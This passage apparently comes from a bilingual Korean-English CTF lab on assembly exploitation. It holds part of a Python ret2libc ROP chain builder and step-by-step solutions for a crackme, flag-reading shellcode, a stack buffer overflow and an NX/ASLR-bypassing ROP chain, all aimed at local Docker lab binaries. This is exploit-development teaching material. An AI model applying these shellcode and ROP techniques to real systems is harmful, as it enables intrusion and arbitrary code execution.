    print("[*] ROP 체인 시뮬레이션")
    print("=" * 60)

    # 예시 가젯 주소 (libc-2.35 기준)
    libc_base  = 0x7ffff7c00000  # ASLR로 변동
    pop_rdi    = libc_base + 0x2a3e5  # pop rdi; ret
    ret_gadget = libc_base + 0x29cd6  # ret
    binsh      = libc_base + 0x1d8698  # "/bin/sh"
    system     = libc_base + 0x50d70   # system()

    offset = 72

    print(f"\n[*] libc 베이스: 0x{libc_base:x}")
    print(f"    pop rdi; ret: 0x{pop_rdi:x}")
    print(f"    /bin/sh:      0x{binsh:x}")
    print(f"    system():     0x{system:x}")

    chain = build_ret2libc_chain(offset, pop_rdi, binsh, system, ret_gadget)

    print(f"\n[*] ROP 체인 ({len(chain)} bytes):")
    print(f"    [padding: {offset} bytes]")
    print(f"    [ret gadget: 0x{ret_gadget:x}]   ← 스택 정렬")
    print(f"    [pop rdi; ret: 0x{pop_rdi:x}]")
    print(f"    [/bin/sh addr: 0x{binsh:x}]")
    print(f"    [system(): 0x{system:x}]")

    print("\n[+] 시뮬레이션: execve(\"/bin/sh\") 호출 성공")
    print("[+] 플래그: CTF{r0p_ch41n_nx_byp4ss_succ3ss}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="ROP 체인 구성 자동화 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 rop_builder.py --simulate\n"
               "  python3 rop_builder.py --binary /workspace/bof_target "
               "--libc /lib/x86_64-linux-gnu/libc.so.6 --offset 72",
    )
    parser.add_argument("--binary", help="타깃 바이너리")
    parser.add_argument("--libc", help="libc 경로")
    parser.add_argument("--offset", type=int, default=72, help="BOF 오프셋")
    parser.add_argument("--simulate", action="store_true")
    args = parser.parse_args()

    if args.simulate or not args.binary:
        simulate_rop()
        return

    if args.libc and PWNTOOLS_AVAILABLE:
        auto_rop_with_pwntools(args.binary, args.libc, args.offset)
    else:
        print("[!] --libc 경로와 pwntools가 필요합니다")
        simulate_rop()


if __name__ == "__main__":
    main()
```

**Step 3: 실행**

```bash
# Docker 환경
docker exec asm-lab python3 /workspace/rop_builder.py --simulate

# 실제 바이너리 (pwntools 필요)
python3 rop_builder.py --binary /workspace/bof_target \
  --libc /lib/x86_64-linux-gnu/libc.so.6 --offset 72
```

---

## 환경 정리

```bash
docker stop asm-lab 2>/dev/null
docker rm asm-lab 2>/dev/null
rm -rf /tmp/asm_ctf
```

---

<a name="english"></a>

# Assembly Language CTF Practice Lab

## Lab Environment Setup

```bash
docker run -d --name asm-lab \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  --platform linux/amd64 \
  -v /tmp/asm_ctf:/workspace \
  ubuntu:22.04 tail -f /dev/null

docker exec asm-lab bash -c "
  apt-get update -q && apt-get install -y -q \
    nasm gcc gcc-multilib gdb gdb-multiarch \
    python3 python3-pip binutils radare2 strace &&
  pip3 install pwntools capstone keystone-engine unicorn
"
pip install pwntools capstone keystone-engine unicorn
```

---

## Challenge 1: x86/x64 Assembly Crackme Analysis

### Objective

Reverse-engineer a binary by disassembling it, analyze the password verification algorithm, find the correct input, and obtain the flag.

**Flag format**: `CTF{4ss3mbly_cr4ckm3_s0lv3d}`

### Solution

```bash
# Compile crackme
docker exec asm-lab bash -c "
nasm -f elf64 /workspace/crackme1.asm -o /workspace/crackme1.o &&
ld /workspace/crackme1.o -o /workspace/crackme1
"

# Analyze: find XOR key and reverse the password
python3 crackme_solver.py --simulate
# Key insight: encoded bytes XOR 0x11 = "S3cr3t!"

# Run with correct password
echo "S3cr3t!" | docker exec -i asm-lab /workspace/crackme1
```

---

## Challenge 2: Shellcode Writing and Validation

### Objective

Write x86-64 Linux shellcode in assembly, execute it in memory, and read the flag file.

**Flag format**: `CTF{shellc0d3_3x3cut10n_succ3ss}`

### Solution

```bash
docker exec asm-lab bash -c "
echo 'CTF{shellc0d3_3x3cut10n_succ3ss}' > /workspace/flag.txt
nasm -f elf64 /workspace/read_flag.asm -o /workspace/read_flag.o &&
ld /workspace/read_flag.o -o /workspace/read_flag &&
/workspace/read_flag
"

# Validate shellcode
python3 shellcode_writer.py --type read-flag \
  --flag-path /workspace/flag.txt --test
```

**Key techniques:**
- JMP-CALL-POP to embed the filename string in shellcode
- Using `open(2)` + `read(0)` + `write(1)` syscall chain
- Avoiding null bytes: `xor rax, rax` then `mov al, 2` instead of `mov rax, 2`

---

## Challenge 3: Assembly-Level Buffer Overflow Exploit

### Objective

Analyze a vulnerable binary's stack layout at the assembly level, calculate the exact offset, overwrite the return address, and obtain the flag.

**Flag format**: `CTF{st4ck_buff3r_0v3rfl0w_4ss3mbly}`

### Solution

```bash
# Build vulnerable binary
docker exec asm-lab bash -c "
gcc -m64 -fno-stack-protector -no-pie -z execstack \
    -o /workspace/bof_target /workspace/bof_target.c -w
"

# Find win() address
docker exec asm-lab nm /workspace/bof_target | grep win

# Exploit
python3 bof_exploit.py --binary /workspace/bof_target --mode auto
# Or simulate
python3 bof_exploit.py --simulate
```

---

## Challenge 4: ROP Chain for ASLR/NX Bypass

### Objective

Collect ROP gadgets from a binary with NX and ASLR enabled, build a chain to call `execve("/bin/sh")`, and obtain the flag.

**Flag format**: `CTF{r0p_ch41n_nx_byp4ss_succ3ss}`

### Solution

```bash
# Find gadgets
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"

# Build and execute ROP chain
python3 rop_builder.py --simulate

# With actual binary
python3 rop_builder.py \
  --binary /workspace/bof_target \
  --libc /lib/x86_64-linux-gnu/libc.so.6 \
  --offset 72
```

**Key chain structure:**
```
[padding: 72 bytes]
[ret gadget]          ← stack alignment
[pop rdi; ret]        ← load /bin/sh address into rdi
[/bin/sh address]
[system() address]
```

---

## Cleanup

```bash
docker stop asm-lab 2>/dev/null && docker rm asm-lab 2>/dev/null
rm -rf /tmp/asm_ctf
```
